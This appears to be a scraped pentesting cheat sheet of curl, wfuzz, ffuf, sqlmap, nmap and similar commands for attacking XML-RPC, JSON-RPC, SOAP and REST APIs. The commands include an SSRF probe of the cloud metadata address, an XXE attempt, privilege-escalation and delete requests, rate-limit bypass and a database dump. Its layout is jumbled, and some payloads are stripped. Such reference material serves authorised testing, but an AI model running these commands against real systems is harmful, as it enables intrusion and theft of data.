# web-service-and-api-attacks

###XML-RPC Attacks

####Manual Request Crafting (curl)

```
curl -X POST -H "Content-Type: text/xml" -d 'examples.getStateName41' http://target.com/RPC2
```

####Fuzzing with wfuzz

```
wfuzz -z file,xmlrpc_methods.txt -d 'FUZZ1' http://target.com/RPC2
```

###JSON-RPC Attacks

####Manual Request Crafting (curl)

```
curl -X POST -H "Content-Type: application/json-rpc" -d '{"method": "sum", "params": {"a": 3, "b": 4}, "id": 0}' http://target.com/ENDPOINT
```

####Fuzzing with wfuzz

```
wfuzz -z file,jsonrpc_methods.txt -d '{"method": "FUZZ", "params": {}, "id": 0}' http://target.com/ENDPOINT
```

###SOAP Attacks

####Manual Request Crafting (curl)

```
curl -X POST -H "Content-Type: text/xml;charset=UTF-8" -d 'Microsoft' http://target.com/Quotation
```

###RESTful API Attacks

####Basic HTTP Requests (curl)

####Fuzzing with wfuzz

####SSRF Tests (curl)

####XXE Tests (curl)

####JWT Attacks (using jwt_tool)

####API Rate Limiting Bypass (using ffuf)

###General Web Service/API Tools

####Nmap (Network Scanning)

####Nikto (Web Server Scanning)

####Gobuster (Directory Brute-forcing)

####SQLmap (SQL Injection)

####Burp Suite (GUI & Automation via Burp APIs)

####Postman (API Testing & Automation via Newman)

####OWASP ZAP (Automated Security Testing)

####Wsdump.pl (WSDL analysis, part of OWASP WSFuzzer)

###Key Things to Remember
- Placeholders: Replace `target.com`, `http://target.com/api/endpoint`, etc., with actual targets.
- Wordlists: Ensure `xmlrpc_methods.txt`, `jsonrpc_methods.txt`, `api_endpoints.txt` exist.
- Dependencies: Install tools (`curl`, `wfuzz`, `nmap`, etc.) before testing.
- Ethical Use: Only test on systems you have explicit permission for.
- Burp Suite/Postman: Primarily GUI tools but support CLI automation.
- OWASP ZAP: Requires CLI tools installed for automation.
Last updated 10 months ago- [XML-RPC Attacks](#xml-rpc-attacks)
- [JSON-RPC Attacks](#json-rpc-attacks)
- [SOAP Attacks](#soap-attacks)
- [RESTful API Attacks](#restful-api-attacks)
- [General Web Service/API Tools](#general-web-service-api-tools)
- [Key Things to Remember](#key-things-to-remember)

```
curl -X GET http://target.com/api/users
curl -X POST -H "Content-Type: application/json" -d '{"username": "test", "password": "password"}' http://target.com/api/login
curl -X PUT -H "Content-Type: application/json" -d '{"admin": true}' http://target.com/api/users/1
curl -X DELETE http://target.com/api/users/1
```

```
wfuzz -z file,api_endpoints.txt http://target.com/api/FUZZ
```

```
curl "http://target.com/api/proxy?url=http://169.254.169.254/"
```

```
curl -X POST -H "Content-Type: application/xml" -d ' ]>&xxe;' http://target.com/api/xml
```

```
jwt_tool  -C
```

```
ffuf -u http://target.com/api/login -X POST -d '{"username": "test", "password": "password"}' -H "Content-Type: application/json" -H "X-Forwarded-For: FUZZ" -w wordlists/ip_list.txt
```

```
nmap -sV -sC target.com
nmap -p 80,443,8080 target.com
```

```
nikto -h target.com
nikto -h target.com -p 8080
```

```
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -k
```

```
sqlmap -u "http://target.com/api/endpoint?id=1" --dbs
sqlmap -u "http://target.com/api/endpoint?id=1" --dump
```

```
newman run collection.json
```

```
zap-cli active-scan -t target.com
```

```
wsdump.pl -o output.txt http://target.com/service?wsdl
```
